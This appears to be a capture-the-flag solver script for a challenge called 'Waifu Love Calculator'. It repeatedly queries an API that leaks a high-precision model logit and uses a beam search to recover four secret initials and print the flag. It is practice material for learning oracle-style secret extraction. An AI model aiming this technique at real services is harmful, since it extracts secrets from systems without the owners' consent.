#!/usr/bin/env python3
"""Solver for Waifu Love Calculator.

Usage:
    python solver/solve.py http://localhost:5000

The attack treats /api/calculate as a black-box confidence oracle. The web page
only shows a rounded percentage, but the API exposes a high-precision logit from
the trained ML model. A simple beam-search coordinate attack recovers the four
memorized initials without knowing the training secret.
"""

from __future__ import annotations

import json
import string
import sys
from typing import Dict, Iterable, List, Tuple
from urllib import request

ALPHABET = string.ascii_uppercase
CACHE: Dict[str, dict] = {}


def post_json(url: str, payload: dict) -> dict:
    body = json.dumps(payload).encode("utf-8")
    req = request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with request.urlopen(req, timeout=8) as response:  # noqa: S310 - CTF solver target is user supplied
        return json.loads(response.read().decode("utf-8"))


def query(base_url: str, candidate: str) -> dict:
    candidate = candidate.upper()
    if candidate not in CACHE:
        a, b = candidate[:2], candidate[2:]
        CACHE[candidate] = post_json(
            base_url.rstrip("/") + "/api/calculate",
            {"person_a": a, "person_b": b},
        )
    return CACHE[candidate]


def score(base_url: str, candidate: str) -> float:
    data = query(base_url, candidate)
    if data.get("match"):
        print(f"[+] Perfect match: {candidate[:2]} + {candidate[2:]}")
        print(f"[+] Flag: {data.get('flag')}")
        raise SystemExit(0)
    return float(data["model_logit"])


def mutate_one_position(candidate: str) -> Iterable[str]:
    chars = list(candidate)
    for pos in range(4):
        original = chars[pos]
        for ch in ALPHABET:
            if ch == original:
                continue
            trial = chars.copy()
            trial[pos] = ch
            yield "".join(trial)


def invert(base_url: str, *, beam_width: int = 12, rounds: int = 8) -> str:
    # Seed the beam with a few spread-out points so the attack is not dependent
    # on one unlucky initial guess.
    beam: List[str] = ["AAAA", "MMMM", "ZZZZ", "LOVE", "CTFS"]
    seen = set(beam)

    for round_no in range(1, rounds + 1):
        pool = set(beam)
        for candidate in beam:
            for trial in mutate_one_position(candidate):
                if trial not in seen:
                    seen.add(trial)
                    pool.add(trial)

        ranked: List[Tuple[float, str]] = []
        for candidate in pool:
            ranked.append((score(base_url, candidate), candidate))
        ranked.sort(reverse=True)
        beam = [candidate for _s, candidate in ranked[:beam_width]]
        print(f"[.] round {round_no}: best={beam[0][:2]}+{beam[0][2:]} logit={ranked[0][0]:.9f}")

    return beam[0]


def submit(base_url: str, candidate: str) -> None:
    a, b = candidate[:2], candidate[2:]
    data = query(base_url, candidate)
    print(f"[+] Recovered initials: {a} + {b}")
    print(f"[+] Compatibility: {data.get('compatibility')}%")
    if data.get("flag"):
        print(f"[+] Flag: {data['flag']}")
    else:
        print("[-] No flag. Increase --rounds/beam_width or inspect the endpoint fields.")


def main() -> None:
    if len(sys.argv) != 2:
        print(__doc__)
        raise SystemExit(2)
    base_url = sys.argv[1]
    candidate = invert(base_url)
    submit(base_url, candidate)


if __name__ == "__main__":
    main()
